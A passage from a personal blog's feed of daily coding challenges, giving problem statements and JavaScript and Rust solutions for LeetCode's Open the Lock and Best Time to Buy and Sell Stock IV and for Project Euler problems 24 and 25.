wheels.</span><br><span class="line"></span><br><span class="line">You are given a list of deadends dead ends, meaning if the lock displays any of these codes, the wheels of the lock will stop turning and you will be unable to open it.</span><br><span class="line"></span><br><span class="line">Given a target representing the value of the wheels that will unlock the lock, return the minimum total number of turns required to open the lock, or -1 if it is impossible.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line">Input: deadends = [&quot;0201&quot;,&quot;0101&quot;,&quot;0102&quot;,&quot;1212&quot;,&quot;2002&quot;], target = &quot;0202&quot;</span><br><span class="line">Output: 6</span><br><span class="line">Explanation:</span><br><span class="line">A sequence of valid moves would be &quot;0000&quot; -&gt; &quot;1000&quot; -&gt; &quot;1100&quot; -&gt; &quot;1200&quot; -&gt; &quot;1201&quot; -&gt; &quot;1202&quot; -&gt; &quot;0202&quot;.</span><br><span class="line">Note that a sequence like &quot;0000&quot; -&gt; &quot;0001&quot; -&gt; &quot;0002&quot; -&gt; &quot;0102&quot; -&gt; &quot;0202&quot; would be invalid,</span><br><span class="line">because the wheels of the lock become stuck after the display becomes the dead end &quot;0102&quot;.</span><br><span class="line">Example 2:</span><br><span class="line">Input: deadends = [&quot;8888&quot;], target = &quot;0009&quot;</span><br><span class="line">Output: 1</span><br><span class="line">Explanation:</span><br><span class="line">We can turn the last wheel in reverse to move from &quot;0000&quot; -&gt; &quot;0009&quot;.</span><br><span class="line">Example 3:</span><br><span class="line">Input: deadends = [&quot;8887&quot;,&quot;8889&quot;,&quot;8878&quot;,&quot;8898&quot;,&quot;8788&quot;,&quot;8988&quot;,&quot;7888&quot;,&quot;9888&quot;], target = &quot;8888&quot;</span><br><span class="line">Output: -1</span><br><span class="line">Explanation:</span><br><span class="line">We can&apos;t reach the target without getting stuck.</span><br><span class="line">Example 4:</span><br><span class="line">Input: deadends = [&quot;0000&quot;], target = &quot;8888&quot;</span><br><span class="line">Output: -1</span><br><span class="line">Note:</span><br><span class="line">The length of deadends will be in the range [1, 500].</span><br><span class="line">target will not be in the list deadends.</span><br><span class="line">Every string in deadends and the string target will be a string of 4 digits from the 10,000 possibilities &apos;0000&apos; to &apos;9999&apos;.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>BFS is capable for it, but better way is two-end bfs.</p><p>By the way, this code is just like shit, I&#39;m going rewrite it later!</p><hr><p>Done!</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string[]&#125; deadends</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; target</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> openLock = <span class="function"><span class="keyword">function</span>(<span class="params">deadends, target</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(deadends.includes(target) || deadends.includes(<span class="string">"0000"</span>)) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">  <span class="keyword">let</span> srcMap = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> s <span class="keyword">of</span> deadends)&#123;</span><br><span class="line">    set.add(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> srcQueue = [];</span><br><span class="line">  <span class="keyword">let</span> tmp;</span><br><span class="line">  srcQueue.push([<span class="string">"0000"</span>,<span class="number">0</span>]);</span><br><span class="line">  srcMap.set(<span class="string">"0000"</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span>(srcQueue.length)&#123;</span><br><span class="line">    <span class="comment">// console.log(srcQueue,dstQueue);</span></span><br><span class="line">    <span class="keyword">let</span> cur = srcQueue.shift();</span><br><span class="line">    <span class="keyword">if</span>(cur[<span class="number">0</span>]==target) <span class="keyword">return</span> cur[<span class="number">1</span>];</span><br><span class="line">    tmp = (+cur[<span class="number">0</span>][<span class="number">0</span>] + <span class="number">1</span>)%<span class="number">10</span> + cur[<span class="number">0</span>].slice(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = cur[<span class="number">0</span>][<span class="number">0</span>] + (+cur[<span class="number">0</span>][<span class="number">1</span>] + <span class="number">1</span>)%<span class="number">10</span> +cur[<span class="number">0</span>].slice(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = cur[<span class="number">0</span>].slice(<span class="number">0</span>, <span class="number">2</span>) + (+cur[<span class="number">0</span>][<span class="number">2</span>] + <span class="number">1</span>)%<span class="number">10</span> + cur[<span class="number">0</span>][<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = cur[<span class="number">0</span>].slice(<span class="number">0</span>, <span class="number">3</span>) + (+cur[<span class="number">0</span>][<span class="number">3</span>] + <span class="number">1</span>)%<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = (+cur[<span class="number">0</span>][<span class="number">0</span>] <span class="number">-1</span> + <span class="number">10</span>)%<span class="number">10</span> + cur[<span class="number">0</span>].slice(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = cur[<span class="number">0</span>][<span class="number">0</span>] + (+cur[<span class="number">0</span>][<span class="number">1</span>] <span class="number">-1</span> + <span class="number">10</span>)%<span class="number">10</span> +cur[<span class="number">0</span>].slice(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = cur[<span class="number">0</span>].slice(<span class="number">0</span>, <span class="number">2</span>) + (+cur[<span class="number">0</span>][<span class="number">2</span>] <span class="number">-1</span> + <span class="number">10</span>)%<span class="number">10</span> + cur[<span class="number">0</span>][<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = cur[<span class="number">0</span>].slice(<span class="number">0</span>, <span class="number">3</span>) + (+cur[<span class="number">0</span>][<span class="number">3</span>] <span class="number">-1</span> + <span class="number">10</span>)%<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Rewrite it!</p><hr><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string[]&#125; deadends</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; target</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> openLock = <span class="function"><span class="keyword">function</span>(<span class="params">deadends, target</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(deadends.includes(target) || deadends.includes(<span class="string">"0000"</span>)) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">  <span class="keyword">let</span> srcMap = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> s <span class="keyword">of</span> deadends)&#123;</span><br><span class="line">    set.add(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> srcQueue = [];</span><br><span class="line">  srcQueue.push([<span class="string">"0000"</span>,<span class="number">0</span>]);</span><br><span class="line">  srcMap.set(<span class="string">"0000"</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">let</span> check = <span class="function">(<span class="params">cur, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// console.log(set);</span></span><br><span class="line">    <span class="keyword">let</span> tmp = cur[<span class="number">0</span>].slice(<span class="number">0</span>,i) + (+cur[<span class="number">0</span>][i] + <span class="number">1</span>)%<span class="number">10</span> + cur[<span class="number">0</span>].slice(i+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// console.log(tmp);</span></span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = cur[<span class="number">0</span>].slice(<span class="number">0</span>,i) + (+cur[<span class="number">0</span>][i] <span class="number">-1</span> + <span class="number">10</span>)%<span class="number">10</span> + cur[<span class="number">0</span>].slice(i+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// console.log(tmp);</span></span><br><span class="line">    <span class="keyword">if</span>(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123;</span><br><span class="line">      srcMap.set(tmp, cur[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      srcQueue.push([tmp, cur[<span class="number">1</span>] + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">while</span>(srcQueue.length)&#123;</span><br><span class="line">    <span class="comment">// console.log(srcQueue);</span></span><br><span class="line">    <span class="keyword">let</span> cur = srcQueue.shift();</span><br><span class="line">    <span class="keyword">if</span>(cur[<span class="number">0</span>] === target) <span class="keyword">return</span> cur[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)&#123;</span><br><span class="line">      check(cur, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(openLock(["0201","0101","0102","1212","2002"],"0202"));</span></span><br><span class="line"><span class="comment">// console.log(openLock(["8888"],"0009"));</span></span><br><span class="line"><span class="comment">// console.log(openLock(["8887","8889","8878","8898","8788","8988","7888","9888"],"8888"));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-14 Daily Challenge</title>
      <link href="/2019-01-14-Daily-Challenge/"/>
      <url>/2019-01-14-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>1000-digit Fibonacci number</em> in <em>Rust</em> and <em>Best Time to Buy and Sell Stock IV</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1000-digit Fibonacci number</span><br><span class="line"></span><br><span class="line">Problem 25 </span><br><span class="line"></span><br><span class="line">The Fibonacci sequence is defined by the recurrence relation:</span><br><span class="line"></span><br><span class="line">Fn = Fn−1 + Fn−2, where F1 = 1 and F2 = 1.</span><br><span class="line">Hence the first 12 terms will be:</span><br><span class="line"></span><br><span class="line">F1 = 1</span><br><span class="line">F2 = 1</span><br><span class="line">F3 = 2</span><br><span class="line">F4 = 3</span><br><span class="line">F5 = 5</span><br><span class="line">F6 = 8</span><br><span class="line">F7 = 13</span><br><span class="line">F8 = 21</span><br><span class="line">F9 = 34</span><br><span class="line">F10 = 55</span><br><span class="line">F11 = 89</span><br><span class="line">F12 = 144</span><br><span class="line">The 12th term, F12, is the first term to contain three digits.</span><br><span class="line"></span><br><span class="line">What is the index of the first term in the Fibonacci sequence to contain 1000 digits?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_traits;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::BigUint;</span><br><span class="line"><span class="keyword">use</span> num_traits::&#123;Zero, One&#125;;</span><br><span class="line"><span class="keyword">use</span> std::mem::replace;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> f0: BigUint = Zero::zero();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> f1: BigUint = One::one();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> f0.to_str_radix(<span class="number">10</span>).len() &lt; <span class="number">1000usize</span> &#123;    </span><br><span class="line">        <span class="keyword">let</span> f2 = f0 + &amp;f1;</span><br><span class="line">        f0 = replace(&amp;<span class="keyword">mut</span> f1, f2);</span><br><span class="line">        index += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">188. Best Time to Buy and Sell Stock IV</span><br><span class="line"></span><br><span class="line">Say you have an array for which the ith element is the price of a given stock on day i.</span><br><span class="line"></span><br><span class="line">Design an algorithm to find the maximum profit. You may complete at most k transactions.</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: [2,4,1], k = 2</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: Buy on day 1 (price = 2) and sell on day 2 (price = 4), profit = 4-2 = 2.</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: [3,2,6,5,0,3], k = 2</span><br><span class="line">Output: 7</span><br><span class="line">Explanation: Buy on day 2 (price = 2) and sell on day 3 (price = 6), profit = 6-2 = 4.</span><br><span class="line">             Then buy on day 5 (price = 0) and sell on day 6 (price = 3), profit = 3-0 = 3.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>DP.</p><p>But I&#39;m too tired doing school project to explain it.</p><p>Leave it for later...</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; k</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; prices</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">k, prices</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!prices.length) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(k*<span class="number">2</span> &gt;= prices.length) <span class="keyword">return</span> maxProf(prices);</span><br><span class="line">  <span class="keyword">let</span> n = prices.length;</span><br><span class="line">  <span class="keyword">let</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">  dp.fill(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">    <span class="keyword">let</span> min_paid = prices[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> prev = dp[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">      <span class="keyword">let</span> tmp = dp[j];</span><br><span class="line">      min_paid = <span class="built_in">Math</span>.min(min_paid, prices[j] - prev);</span><br><span class="line">      dp[j] = <span class="built_in">Math</span>.max(dp[j<span class="number">-1</span>], prices[j]-min_paid);</span><br><span class="line">      prev = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp[n<span class="number">-1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; prices</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">maxProf</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> n = prices.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span>(prices[i] &gt; prices[i<span class="number">-1</span>]) ans += prices[i]-prices[i<span class="number">-1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(maxProfit(2,[2,1,2,0,1]));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-13 Daily Challenge</title>
      <link href="/2019-01-13-Daily-Challenge/"/>
      <url>/2019-01-13-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Lexicographic permutations</em> in <em>Rust</em> and <em>Unique Binary Search Trees II</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Lexicographic permutations</span><br><span class="line"></span><br><span class="line">Problem 24 </span><br><span class="line"></span><br><span class="line">A permutation is an ordered arrangement of objects. For example, 3124 is one possible permutation of the digits 1, 2, 3 and 4. If all of the permutations are listed numerically or alphabetically, we call it lexicographic order. The lexicographic permutations of 0, 1 and 2 are:</span><br><span class="line"></span><br><span class="line">012   021   102   120   201   210</span><br><span class="line"></span><br><span class="line">What is the millionth lexicographic permutation of the digits 0, 1, 2, 3, 4, 5, 6, 7, 8 and 9?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I&#39;ve done it with javascript in <a href="https://csuwangj.github.io/2019-01-03-Daily-Challenge/">2019-01-03 Daily Challenge</a>, so what I need to do is just translate it into Rust.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::vec::<span class="built_in">Vec</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nth_permutation(<span class="number">3</span>, <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">""</span>);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nth_permutation(<span class="number">4</span>, <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="built_in">print!</span>(<span class="string">"&#123;&#125;"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">""</span>);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nth_permutation(<span class="number">10</span>, <span class="number">1_000_000</span>) &#123;</span><br><span class="line">        <span class="built_in">print!</span>(<span class="string">"&#123;&#125;"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">nth_permutation</span></span>(n: <span class="built_in">i32</span>, <span class="keyword">mut</span> k: <span class="built_in">i64</span>) -&gt; <span class="built_in">Vec</span>&lt;<span class="built_in">i32</span>&gt; &#123;</span><br><span class="line">    k -= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> fac: <span class="built_in">Vec</span>&lt;<span class="built_in">i64</span>&gt; = [<span class="number">1</span>].to_vec();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span 